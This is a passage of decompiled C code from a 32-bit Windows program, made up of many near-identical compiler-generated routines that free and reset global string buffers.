// 4F9894: using guessed type int dword_4F9894;

//----- (0048A560) --------------------------------------------------------
void __cdecl sub_48A560()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9A14 >= 0x10 )
  {
    v0 = dword_4F9A00;
    if ( (unsigned int)(dword_4F9A14 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9A00 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9A00 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9A10 = 0;
  dword_4F9A14 = 15;
  LOBYTE(dword_4F9A00) = 0;
}
// 4F9A10: using guessed type int dword_4F9A10;
// 4F9A14: using guessed type int dword_4F9A14;

//----- (0048A5C0) --------------------------------------------------------
void __cdecl sub_48A5C0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9B64 >= 0x10 )
  {
    v0 = dword_4F9B50;
    if ( (unsigned int)(dword_4F9B64 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9B50 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9B50 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9B60 = 0;
  dword_4F9B64 = 15;
  LOBYTE(dword_4F9B50) = 0;
}
// 4F9B60: using guessed type int dword_4F9B60;
// 4F9B64: using guessed type int dword_4F9B64;

//----- (0048A620) --------------------------------------------------------
void __cdecl sub_48A620()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F999C >= 0x10 )
  {
    v0 = dword_4F9988;
    if ( (unsigned int)(dword_4F999C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9988 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9988 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9998 = 0;
  dword_4F999C = 15;
  LOBYTE(dword_4F9988) = 0;
}
// 4F9998: using guessed type int dword_4F9998;
// 4F999C: using guessed type int dword_4F999C;

//----- (0048A680) --------------------------------------------------------
void __cdecl sub_48A680()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9B4C >= 0x10 )
  {
    v0 = dword_4F9B38;
    if ( (unsigned int)(dword_4F9B4C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9B38 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9B38 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9B48 = 0;
  dword_4F9B4C = 15;
  LOBYTE(dword_4F9B38) = 0;
}
// 4F9B48: using guessed type int dword_4F9B48;
// 4F9B4C: using guessed type int dword_4F9B4C;

//----- (0048A6E0) --------------------------------------------------------
void __cdecl sub_48A6E0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F99B4 >= 0x10 )
  {
    v0 = dword_4F99A0;
    if ( (unsigned int)(dword_4F99B4 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F99A0 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F99A0 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F99B0 = 0;
  dword_4F99B4 = 15;
  LOBYTE(dword_4F99A0) = 0;
}
// 4F99B0: using guessed type int dword_4F99B0;
// 4F99B4: using guessed type int dword_4F99B4;

//----- (0048A740) --------------------------------------------------------
void __cdecl sub_48A740()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9BC4 >= 0x10 )
  {
    v0 = dword_4F9BB0;
    if ( (unsigned int)(dword_4F9BC4 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9BB0 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9BB0 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9BC0 = 0;
  dword_4F9BC4 = 15;
  LOBYTE(dword_4F9BB0) = 0;
}
// 4F9BC0: using guessed type int dword_4F9BC0;
// 4F9BC4: using guessed type int dword_4F9BC4;

//----- (0048A7A0) --------------------------------------------------------
void __cdecl sub_48A7A0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9AEC >= 0x10 )
  {
    v0 = dword_4F9AD8;
    if ( (unsigned int)(dword_4F9AEC + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9AD8 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9AD8 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9AE8 = 0;
  dword_4F9AEC = 15;
  LOBYTE(dword_4F9AD8) = 0;
}
// 4F9AE8: using guessed type int dword_4F9AE8;
// 4F9AEC: using guessed type int dword_4F9AEC;

//----- (0048A800) --------------------------------------------------------
void __cdecl sub_48A800()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9C3C >= 0x10 )
  {
    v0 = dword_4F9C28;
    if ( (unsigned int)(dword_4F9C3C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9C28 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9C28 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9C38 = 0;
  dword_4F9C3C = 15;
  LOBYTE(dword_4F9C28) = 0;
}
// 4F9C38: using guessed type int dword_4F9C38;
// 4F9C3C: using guessed type int dword_4F9C3C;

//----- (0048A860) --------------------------------------------------------
void __cdecl sub_48A860()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9A74 >= 0x10 )
  {
    v0 = dword_4F9A60;
    if ( (unsigned int)(dword_4F9A74 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9A60 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9A60 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9A70 = 0;
  dword_4F9A74 = 15;
  LOBYTE(dword_4F9A60) = 0;
}
// 4F9A70: using guessed type int dword_4F9A70;
// 4F9A74: using guessed type int dword_4F9A74;

//----- (0048A8C0) --------------------------------------------------------
void __cdecl sub_48A8C0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F99CC >= 0x10 )
  {
    v0 = dword_4F99B8;
    if ( (unsigned int)(dword_4F99CC + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F99B8 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F99B8 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F99C8 = 0;
  dword_4F99CC = 15;
  LOBYTE(dword_4F99B8) = 0;
}
// 4F99C8: using guessed type int dword_4F99C8;
// 4F99CC: using guessed type int dword_4F99CC;

//----- (0048A920) --------------------------------------------------------
void __cdecl sub_48A920()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F99E4 >= 0x10 )
  {
    v0 = dword_4F99D0;
    if ( (unsigned int)(dword_4F99E4 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F99D0 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F99D0 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F99E0 = 0;
  dword_4F99E4 = 15;
  LOBYTE(dword_4F99D0) = 0;
}
// 4F99E0: using guessed type int dword_4F99E0;
// 4F99E4: using guessed type int dword_4F99E4;

//----- (0048A980) --------------------------------------------------------
void __cdecl sub_48A980()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F98AC >= 0x10 )
  {
    v0 = dword_4F9898;
    if ( (unsigned int)(dword_4F98AC + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9898 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9898 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F98A8 = 0;
  dword_4F98AC = 15;
  LOBYTE(dword_4F9898) = 0;
}
// 4F98A8: using guessed type int dword_4F98A8;
// 4F98AC: using guessed type int dword_4F98AC;

//----- (0048A9E0) --------------------------------------------------------
void __cdecl sub_48A9E0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9A2C >= 0x10 )
  {
    v0 = dword_4F9A18;
    if ( (unsigned int)(dword_4F9A2C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9A18 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9A18 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9A28 = 0;
  dword_4F9A2C = 15;
  LOBYTE(dword_4F9A18) = 0;
}
// 4F9A28: using guessed type int dword_4F9A28;
// 4F9A2C: using guessed type int dword_4F9A2C;

//----- (0048AA40) --------------------------------------------------------
void __cdecl sub_48AA40()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9A8C >= 0x10 )
  {
    v0 = dword_4F9A78;
    if ( (unsigned int)(dword_4F9A8C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9A78 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9A78 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9A88 = 0;
  dword_4F9A8C = 15;
  LOBYTE(dword_4F9A78) = 0;
}
// 4F9A88: using guessed type int dword_4F9A88;
// 4F9A8C: using guessed type int dword_4F9A8C;

//----- (0048AAA0) --------------------------------------------------------
void __cdecl sub_48AAA0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9B04 >= 0x10 )
  {
    v0 = dword_4F9AF0;
    if ( (unsigned int)(dword_4F9B04 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9AF0 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9AF0 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9B00 = 0;
  dword_4F9B04 = 15;
  LOBYTE(dword_4F9AF0) = 0;
}
// 4F9B00: using guessed type int dword_4F9B00;
// 4F9B04: using guessed type int dword_4F9B04;

//----- (0048AB00) --------------------------------------------------------
void __cdecl sub_48AB00()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9AD4 >= 0x10 )
  {
    v0 = dword_4F9AC0;
    if ( (unsigned int)(dword_4F9AD4 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9AC0 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9AC0 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9AD0 = 0;
  dword_4F9AD4 = 15;
  LOBYTE(dword_4F9AC0) = 0;
}
// 4F9AD0: using guessed type int dword_4F9AD0;
// 4F9AD4: using guessed type int dword_4F9AD4;

//----- (0048AB60) --------------------------------------------------------
void __cdecl sub_48AB60()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F993C >= 0x10 )
  {
    v0 = dword_4F9928;
    if ( (unsigned int)(dword_4F993C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9928 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9928 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9938 = 0;
  dword_4F993C = 15;
  LOBYTE(dword_4F9928) = 0;
}
// 4F9938: using guessed type int dword_4F9938;
// 4F993C: using guessed type int dword_4F993C;

//----- (0048ABC0) --------------------------------------------------------
void __cdecl sub_48ABC0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9804 >= 0x10 )
  {
    v0 = dword_4F97F0;
    if ( (unsigned int)(dword_4F9804 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F97F0 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F97F0 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9800 = 0;
  dword_4F9804 = 15;
  LOBYTE(dword_4F97F0) = 0;
}
// 4F9800: using guessed type int dword_4F9800;
// 4F9804: using guessed type int dword_4F9804;

//----- (0048AC20) --------------------------------------------------------
void __cdecl sub_48AC20()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9864 >= 0x10 )
  {
    v0 = dword_4F9850;
    if ( (unsigned int)(dword_4F9864 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9850 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9850 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9860 = 0;
  dword_4F9864 = 15;
  LOBYTE(dword_4F9850) = 0;
}
// 4F9860: using guessed type int dword_4F9860;
// 4F9864: using guessed type int dword_4F9864;

//----- (0048AC80) --------------------------------------------------------
void __cdecl sub_48AC80()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9C0C >= 0x10 )
  {
    v0 = dword_4F9BF8;
    if ( (unsigned int)(dword_4F9C0C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9BF8 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9BF8 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9C08 = 0;
  dword_4F9C0C = 15;
  LOBYTE(dword_4F9BF8) = 0;
}
// 4F9C08: using guessed type int dword_4F9C08;
// 4F9C0C: using guessed type int dword_4F9C0C;

//----- (0048ACE0) --------------------------------------------------------
void __cdecl sub_48ACE0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9BF4 >= 0x10 )
  {
    v0 = dword_4F9BE0;
    if ( (unsigned int)(dword_4F9BF4 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9BE0 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9BE0 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9BF0 = 0;
  dword_4F9BF4 = 15;
  LOBYTE(dword_4F9BE0) = 0;
}
// 4F9BF0: using guessed type int dword_4F9BF0;
// 4F9BF4: using guessed type int dword_4F9BF4;

//----- (0048AD40) --------------------------------------------------------
void __cdecl sub_48AD40()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9834 >= 0x10 )
  {
    v0 = dword_4F9820;
    if ( (unsigned int)(dword_4F9834 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9820 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9820 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9830 = 0;
  dword_4F9834 = 15;
  LOBYTE(dword_4F9820) = 0;
}
// 4F9830: using guessed type int dword_4F9830;
// 4F9834: using guessed type int dword_4F9834;

//----- (0048ADA0) --------------------------------------------------------
void __cdecl sub_48ADA0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F99FC >= 0x10 )
  {
    v0 = dword_4F99E8;
    if ( (unsigned int)(dword_4F99FC + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F99E8 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F99E8 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F99F8 = 0;
  dword_4F99FC = 15;
  LOBYTE(dword_4F99E8) = 0;
}
// 4F99F8: using guessed type int dword_4F99F8;
// 4F99FC: using guessed type int dword_4F99FC;

//----- (0048AE00) --------------------------------------------------------
void __cdecl sub_48AE00()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F981C >= 0x10 )
  {
    v0 = dword_4F9808;
    if ( (unsigned int)(dword_4F981C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9808 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9808 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9818 = 0;
  dword_4F981C = 15;
  LOBYTE(dword_4F9808) = 0;
}
// 4F9818: using guessed type int dword_4F9818;
// 4F981C: using guessed type int dword_4F981C;

//----- (0048AE60) --------------------------------------------------------
void __cdecl sub_48AE60()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9B94 >= 0x10 )
  {
    v0 = dword_4F9B80;
    if ( (unsigned int)(dword_4F9B94 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9B80 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9B80 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9B90 = 0;
  dword_4F9B94 = 15;
  LOBYTE(dword_4F9B80) = 0;
}
// 4F9B90: using guessed type int dword_4F9B90;
// 4F9B94: using guessed type int dword_4F9B94;

//----- (0048AEC0) --------------------------------------------------------
void __cdecl sub_48AEC0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F987C >= 0x10 )
  {
    v0 = dword_4F9868;
    if ( (unsigned int)(dword_4F987C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9868 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9868 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9878 = 0;
  dword_4F987C = 15;
  LOBYTE(dword_4F9868) = 0;
}
// 4F9878: using guessed type int dword_4F9878;
// 4F987C: using guessed type int dword_4F987C;

//----- (0048AF20) --------------------------------------------------------
void __cdecl sub_48AF20()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F98F4 >= 0x10 )
  {
    v0 = dword_4F98E0;
    if ( (unsigned int)(dword_4F98F4 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F98E0 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F98E0 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F98F0 = 0;
  dword_4F98F4 = 15;
  LOBYTE(dword_4F98E0) = 0;
}
// 4F98F0: using guessed type int dword_4F98F0;
// 4F98F4: using guessed type int dword_4F98F4;

//----- (0048AF80) --------------------------------------------------------
void __cdecl sub_48AF80()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9924 >= 0x10 )
  {
    v0 = dword_4F9910;
    if ( (unsigned int)(dword_4F9924 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9910 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9910 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9920 = 0;
  dword_4F9924 = 15;
  LOBYTE(dword_4F9910) = 0;
}
// 4F9920: using guessed type int dword_4F9920;
// 4F9924: using guessed type int dword_4F9924;

//----- (0048AFE0) --------------------------------------------------------
void __cdecl sub_48AFE0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F98C4 >= 0x10 )
  {
    v0 = dword_4F98B0;
    if ( (unsigned int)(dword_4F98C4 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F98B0 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F98B0 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F98C0 = 0;
  dword_4F98C4 = 15;
  LOBYTE(dword_4F98B0) = 0;
}
// 4F98C0: using guessed type int dword_4F98C0;
// 4F98C4: using guessed type int dword_4F98C4;

//----- (0048B040) --------------------------------------------------------
void __cdecl sub_48B040()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9C24 >= 0x10 )
  {
    v0 = dword_4F9C10;
    if ( (unsigned int)(dword_4F9C24 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9C10 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9C10 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9C20 = 0;
  dword_4F9C24 = 15;
  LOBYTE(dword_4F9C10) = 0;
}
// 4F9C20: using guessed type int dword_4F9C20;
// 4F9C24: using guessed type int dword_4F9C24;

//----- (0048B0A0) --------------------------------------------------------
void __cdecl sub_48B0A0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F990C >= 0x10 )
  {
    v0 = dword_4F98F8;
    if ( (unsigned int)(dword_4F990C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F98F8 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F98F8 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9908 = 0;
  dword_4F990C = 15;
  LOBYTE(dword_4F98F8) = 0;
}
// 4F9908: using guessed type int dword_4F9908;
// 4F990C: using guessed type int dword_4F990C;

//----- (0048B100) --------------------------------------------------------
void __cdecl sub_48B100()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F98DC >= 0x10 )
  {
    v0 = dword_4F98C8;
    if ( (unsigned int)(dword_4F98DC + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F98C8 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F98C8 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F98D8 = 0;
  dword_4F98DC = 15;
  LOBYTE(dword_4F98C8) = 0;
}
// 4F98D8: using guessed type int dword_4F98D8;
// 4F98DC: using guessed type int dword_4F98DC;

//----- (0048B160) --------------------------------------------------------
void __cdecl sub_48B160()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F97EC >= 0x10 )
  {
    v0 = dword_4F97D8;
    if ( (unsigned int)(dword_4F97EC + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F97D8 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F97D8 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F97E8 = 0;
  dword_4F97EC = 15;
  LOBYTE(dword_4F97D8) = 0;
}
// 4F97E8: using guessed type int dword_4F97E8;
// 4F97EC: using guessed type int dword_4F97EC;

//----- (0048B1C0) --------------------------------------------------------
void __cdecl sub_48B1C0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9C54 >= 0x10 )
  {
    v0 = dword_4F9C40;
    if ( (unsigned int)(dword_4F9C54 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9C40 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9C40 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9C50 = 0;
  dword_4F9C54 = 15;
  LOBYTE(dword_4F9C40) = 0;
}
// 4F9C50: using guessed type int dword_4F9C50;
// 4F9C54: using guessed type int dword_4F9C54;

//----- (0048B220) --------------------------------------------------------
void __cdecl sub_48B220()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9ABC >= 0x10 )
  {
    v0 = dword_4F9AA8;
    if ( (unsigned int)(dword_4F9ABC + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9AA8 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9AA8 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9AB8 = 0;
  dword_4F9ABC = 15;
  LOBYTE(dword_4F9AA8) = 0;
}
// 4F9AB8: using guessed type int dword_4F9AB8;
// 4F9ABC: using guessed type int dword_4F9ABC;

//----- (0048B280) --------------------------------------------------------
void __cdecl sub_48B280()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9BAC >= 0x10 )
  {
    v0 = dword_4F9B98;
    if ( (unsigned int)(dword_4F9BAC + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9B98 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9B98 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9BA8 = 0;
  dword_4F9BAC = 15;
  LOBYTE(dword_4F9B98) = 0;
}
// 4F9BA8: using guessed type int dword_4F9BA8;
// 4F9BAC: using guessed type int dword_4F9BAC;

//----- (0048B2E0) --------------------------------------------------------
void __cdecl sub_48B2E0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9A44 >= 0x10 )
  {
    v0 = dword_4F9A30;
    if ( (unsigned int)(dword_4F9A44 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9A30 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9A30 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9A40 = 0;
  dword_4F9A44 = 15;
  LOBYTE(dword_4F9A30) = 0;
}
// 4F9A40: using guessed type int dword_4F9A40;
// 4F9A44: using guessed type int dword_4F9A44;

//----- (0048B340) --------------------------------------------------------
void __cdecl sub_48B340()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9B34 >= 0x10 )
  {
    v0 = dword_4F9B20;
    if ( (unsigned int)(dword_4F9B34 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9B20 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9B20 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9B30 = 0;
  dword_4F9B34 = 15;
  LOBYTE(dword_4F9B20) = 0;
}
// 4F9B30: using guessed type int dword_4F9B30;
// 4F9B34: using guessed type int dword_4F9B34;

//----- (0048B3A0) --------------------------------------------------------
void __cdecl sub_48B3A0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F996C >= 0x10 )
  {
    v0 = dword_4F9958;
    if ( (unsigned int)(dword_4F996C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9958 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9958 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9968 = 0;
  dword_4F996C = 15;
  LOBYTE(dword_4F9958) = 0;
}
// 4F9968: using guessed type int dword_4F9968;
// 4F996C: using guessed type int dword_4F996C;

//----- (0048B400) --------------------------------------------------------
void __cdecl sub_48B400()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9984 >= 0x10 )
  {
    v0 = dword_4F9970;
    if ( (unsigned int)(dword_4F9984 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9970 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9970 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9980 = 0;
  dword_4F9984 = 15;
  LOBYTE(dword_4F9970) = 0;
}
// 4F9980: using guessed type int dword_4F9980;
// 4F9984: using guessed type int dword_4F9984;

//----- (0048B460) --------------------------------------------------------
void __cdecl sub_48B460()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9BDC >= 0x10 )
  {
    v0 = dword_4F9BC8;
    if ( (unsigned int)(dword_4F9BDC + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9BC8 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9BC8 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9BD8 = 0;
  dword_4F9BDC = 15;
  LOBYTE(dword_4F9BC8) = 0;
}
// 4F9BD8: using guessed type int dword_4F9BD8;
// 4F9BDC: using guessed type int dword_4F9BDC;

//----- (0048B4C0) --------------------------------------------------------
void __cdecl sub_48B4C0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9B7C >= 0x10 )
  {
    v0 = dword_4F9B68;
    if ( (unsigned int)(dword_4F9B7C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9B68 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9B68 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9B78 = 0;
  dword_4F9B7C = 15;
  LOBYTE(dword_4F9B68) = 0;
}
